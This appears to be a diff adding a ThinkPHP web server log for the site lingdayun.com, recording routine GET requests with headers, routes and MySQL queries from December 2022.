+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T05:18:57+08:00 ] 10.0.8.4 124.71.166.204 GET /index.html
+[ log ] www.lingdayun.com/index.html [运行时间：0.080075s][吞吐率：12.49req/s] [内存消耗：1,279.57kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 8.5; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2823.88 Safari/537.36',
+  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
+  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/index_html' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T05:31:11+08:00 ] 10.0.8.4 51.222.253.20 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.079044s][吞吐率：12.65req/s] [内存消耗：1,276.02kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T05:47:09+08:00 ] 10.0.8.4 120.230.93.117 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.109354s][吞吐率：9.14req/s] [内存消耗：1,916.53kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 12; Redmi K30 Pro Zoom Edition Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/2758 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000826s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003079s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000383s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T06:31:12+08:00 ] 10.0.8.4 220.196.160.61 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.083698s][吞吐率：11.95req/s] [内存消耗：1,276.78kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone os 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/11D257 Safari/604.1',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T06:31:14+08:00 ] 10.0.8.4 180.101.244.11 GET /
+[ log ] lingdayun.com/ [运行时间：0.087203s][吞吐率：11.47req/s] [内存消耗：1,276.76kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone os 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/11D257 Safari/604.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T08:10:50+08:00 ] 10.0.8.4 39.144.162.75 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.112882s][吞吐率：8.86req/s] [内存消耗：1,916.55kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 12; 2106118C Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220903 Mobile Safari/537.36 MMWEBID/7475 MicroMessenger/8.0.28.2240(0x28001C57) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000921s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003213s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000424s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T08:39:48+08:00 ] 10.0.8.4 171.109.175.120 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.119100s][吞吐率：8.40req/s] [内存消耗：1,916.60kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/533 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/4G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000998s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003757s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000474s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T09:51:35+08:00 ] 10.0.8.4 124.133.41.227 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.126323s][吞吐率：7.92req/s] [内存消耗：1,916.39kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63080029)',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000780s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003158s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000523s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T09:52:11+08:00 ] 10.0.8.4 124.133.41.227 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.157335s][吞吐率：6.36req/s] [内存消耗：1,916.59kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_car.html',
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63080029)',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000988s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.004137s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000531s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T09:52:11+08:00 ] 10.0.8.4 124.133.41.227 GET /index.php/api/base/find_car
+[ log ] www.lingdayun.com/index.php/api/base/find_car [运行时间：0.165066s][吞吐率：6.06req/s] [内存消耗：1,900.95kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'base',
+    2 => 'find_car',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_car.html',
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63080029)',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\api\controller\Base->find_car[ C:\wwwroot\www.lingdayun.com\application\api\controller\Base.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000670s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_driver` [ RunTime:0.003611s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_driver` WHERE  (  status=1 ) [ RunTime:0.000473s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T09:52:35+08:00 ] 10.0.8.4 218.12.19.118 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.128041s][吞吐率：7.81req/s] [内存消耗：1,916.30kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept-language' => 'zh-CN,zh-Hans;q=0.9',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.31(0x18001f26) NetType/4G Language/zh_CN',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.016032s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003763s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000528s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T09:54:54+08:00 ] 10.0.8.4 223.72.83.250 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.136632s][吞吐率：7.32req/s] [内存消耗：1,916.83kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=bknnn3bshlj54nat6bat2v6bu6',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; LYA-AL00 Build/HUAWEILYA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/5819 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007785s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.004074s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000520s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T11:33:13+08:00 ] 10.0.8.4 58.211.72.35 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.083744s][吞吐率：11.94req/s] [内存消耗：1,275.71kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'host' => 'www.lingdayun.com',
+  'user-agent' => 'Java/1.8.0_141',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T11:39:15+08:00 ] 10.0.8.4 39.144.21.234 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.106946s][吞吐率：9.35req/s] [内存消耗：1,916.30kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept-language' => 'zh-CN,zh-Hans;q=0.9',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.31(0x18001f26) NetType/4G Language/zh_CN',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000764s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.002821s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000338s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T11:39:26+08:00 ] 10.0.8.4 39.144.21.234 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.118115s][吞吐率：8.47req/s] [内存消耗：1,916.41kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept-language' => 'zh-CN,zh-Hans;q=0.9',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.31(0x18001f26) NetType/4G Language/zh_CN',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000872s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.002966s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000377s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T11:42:19+08:00 ] 10.0.8.4 220.196.160.73 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.085218s][吞吐率：11.73req/s] [内存消耗：1,276.60kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Java/1.8.0_141',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T11:45:15+08:00 ] 10.0.8.4 223.72.83.250 GET /
+[ log ] lingdayun.com/ [运行时间：0.084679s][吞吐率：11.81req/s] [内存消耗：1,276.70kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T11:55:35+08:00 ] 10.0.8.4 223.72.83.250 GET /
+[ log ] lingdayun.com/ [运行时间：0.078503s][吞吐率：12.74req/s] [内存消耗：1,276.81kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
